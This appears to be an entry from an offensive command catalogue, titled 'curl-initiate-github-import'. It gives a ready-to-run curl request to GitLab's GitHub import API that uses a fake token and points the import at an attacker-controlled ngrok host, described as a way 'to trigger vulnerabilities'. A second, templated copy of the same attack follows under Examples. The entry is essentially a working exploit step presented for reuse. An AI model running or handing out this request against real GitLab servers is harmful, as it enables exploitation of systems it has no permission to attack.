---
data: >-
  curl --request POST --url "http://gitlab.wbowling.info/api/v4/import/github" 
  --header "content-type: application/json" --header "PRIVATE-TOKEN: API_TOKEN"
  --data "{\"personal_access_token\": \"fake_token\",\"repo_id\":
  \"12345\",\"target_namespace\": \"root\",\"new_name\":
  \"gh-import-$RANDOM\",\"github_hostname\":
  \"https://9895-45-248-49-157.ngrok.io\"}"
tags:
  - api-request
  - curl
type: command
executor: bash
platforms:
  - Linux
id: d5cbc990-cef0-4208-926f-7dace5afe588
created_at: '2025-12-11T03:48:06.027Z'
updated_at: '2025-12-11T03:48:06.027Z'
verified: false
validated: true
submitted: true
---
# curl-initiate-github-import

## Command

```bash
curl --request POST --url "http://gitlab.wbowling.info/api/v4/import/github"  --header "content-type: application/json" --header "PRIVATE-TOKEN: API_TOKEN" --data "{\"personal_access_token\": \"fake_token\",\"repo_id\": \"12345\",\"target_namespace\": \"root\",\"new_name\": \"gh-import-$RANDOM\",\"github_hostname\": \"https://9895-45-248-49-157.ngrok.io\"}"
```

## Description

Sends a POST request to GitLab's import API to start a GitHub repository import, using fake details to trigger vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--request POST` | HTTP method | Yes |
| `--url` | API endpoint | Yes |
| `--header` | Content type and token | Yes |
| `--data` | JSON payload with import details | Yes |

## Examples

### Basic Usage

```bash
curl --request POST --url "http://gitlab.example.com/api/v4/import/github" --header "content-type: application/json" --header "PRIVATE-TOKEN: token" --data '{"personal_access_token": "fake", "repo_id": "12345", "target_namespace": "root", "new_name": "import-test", "github_hostname": "https://ngrok-url"}'
```

## Expected Output

JSON response indicating import started, triggers backend processes.

## Related

- [[procedures/Initiate-GitHub-Repository-Import-on-GitLab]]
- #curl
